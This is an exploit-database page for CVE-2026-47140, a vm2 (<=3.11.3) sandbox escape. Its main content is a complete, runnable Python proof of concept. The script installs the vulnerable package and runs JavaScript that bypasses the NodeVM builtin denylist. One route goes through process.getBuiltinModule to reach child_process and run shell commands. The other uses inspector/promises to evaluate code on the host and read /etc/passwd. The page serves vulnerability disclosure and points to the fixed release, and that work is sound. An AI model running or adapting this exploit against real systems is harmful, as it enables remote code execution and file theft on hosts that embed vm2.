---
title: vm2 < = 3.11.3 - NodeVM Builtin Denylist Bypass
url: https://cxsecurity.com/issue/WLB-2026060015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-06-22
fetch_date: 2026-06-23T06:06:34.300891
---

# vm2 < = 3.11.3 - NodeVM Builtin Denylist Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **vm2 <= 3.11.3 - NodeVM Builtin Denylist Bypass** **2026.06.22**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-47140](https://cxsecurity.com/cveshow/CVE-2026-47140/ "Click to see CVE-2026-47140")**  CWE: **[CWE-693 Protection Mechanism Failure](https://cxsecurity.com/cwe/CWE-693%20Protection%20Mechanism%20Failure "Click to see CWE-693 Protection Mechanism Failure")** | |

#!/usr/bin/env python3
# Exploit Title: vm2 <= 3.11.3 - NodeVM Builtin Denylist Bypass (Sandbox Escape)
# CVE: CVE-2026-47140
# Date: 2026-06-20
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Author Blog : https://banyamersecurity.com/blog/
# Vendor Homepage: https://github.com/patriksimek/vm2
# Software Link: https://github.com/patriksimek/vm2
# Affected: vm2 <= 3.11.3
# Tested on: Node.js 18/20 + Python 3
# Category: Remote Code Execution
# Platform: Node.js
# Exploit Type: Sandbox Escape
# CVSS: 9.8
# Description: vm2 NodeVM builtin denylist bypass via process.getBuiltinModule and inspector/promises leading to host RCE.
# Fixed in: vm2 3.11.4
# Usage:
# python3 exploit.py
#
# Examples:
# python3 exploit.py
#
# Options:
# --
#
# Notes:
# • Requires Node.js and npm installed
#
# How to Use
#
# Step 1:
# Save as exploit.py and run
#
# Step 2:
# The script auto-downloads vulnerable vm2 and executes the PoC
def banner():
print(r"""
╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗
║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║
║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝
║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗
║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║
╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝
╔═╗ Banyamer Security ╔═╗
""")
import subprocess
import sys
import os
import tempfile
import shutil
def run\_command(cmd, cwd=None):
try:
result = subprocess.run(cmd, shell=True, cwd=cwd, capture\_output=True, text=True, timeout=10)
return result.stdout.strip(), result.stderr.strip(), result.returncode
except Exception as e:
return "", str(e), -1
def main():
banner()
print("=== CVE-2026-47140 PoC - vm2 Sandbox Escape ===\n")
with tempfile.TemporaryDirectory() as tmpdir:
print(f"Working directory: {tmpdir}")
print("[+] Installing vulnerable vm2@3.11.3...")
run\_command("npm init -y", tmpdir)
stdout, stderr, code = run\_command("npm install vm2@3.11.3", tmpdir)
if code != 0:
print("[-] Failed to install vm2. Make sure Node.js + npm are installed.")
print(stderr)
return
exploit\_js = """
const { NodeVM } = require('vm2');
console.log('[+] Running CVE-2026-47140 exploit\\n');
const vm1 = new NodeVM({
console: 'inherit',
sandbox: {},
require: {
builtin: ['\*', '-child\_process'],
external: false
}
});
try {
const output = vm1.run(`
const processMod = require('process');
const cp = processMod.getBuiltinModule('child\_process');
const result = cp.execSync('id && whoami && hostname', { encoding: 'utf8' });
module.exports = result;
`);
console.log("✅ SUCCESS (process bypass):\\n" + output);
} catch (e) {
console.error("❌ Exploit 1 failed:", e.message);
}
const vm2 = new NodeVM({
console: 'inherit',
sandbox: {},
require: {
builtin: ['\*'],
external: false
},
allowAsync: true
});
vm2.run(`
(async () => {
const { Session } = require('inspector/promises');
const session = new Session();
await session.connect();
await session.post('Runtime.enable');
const res = await session.post('Runtime.evaluate', {
expression: 'require("fs").readFileSync("/etc/passwd", "utf8").split("\\n").slice(0,3).join("\\n")',
returnByValue: true
});
console.log("✅ SUCCESS (inspector bypass):\\n" + res.result.value);
session.disconnect();
})().catch(e => console.error(e));
`, 'exploit.js');
"""
exploit\_path = os.path.join(tmpdir, "exploit.js")
with open(exploit\_path, "w") as f:
f.write(exploit\_js)
print("\n[+] Executing the exploit...")
stdout, stderr, code = run\_command("node exploit.js", tmpdir)
print("\n" + "="\*60)
print(stdout)
if stderr:
print("STDERR:", stderr)
print("\n[+] PoC completed. Update to vm2@3.11.4 or newer.")
if \_\_name\_\_ == "\_\_main\_\_":
if shutil.which("node") is None or shutil.which("npm") is None:
print("Error: Node.js and npm are required.")
sys.exit(1)
main()

**##### References:**

https://github.com/patriksimek/vm2/releases/tag/v3.11.4

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026060015)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top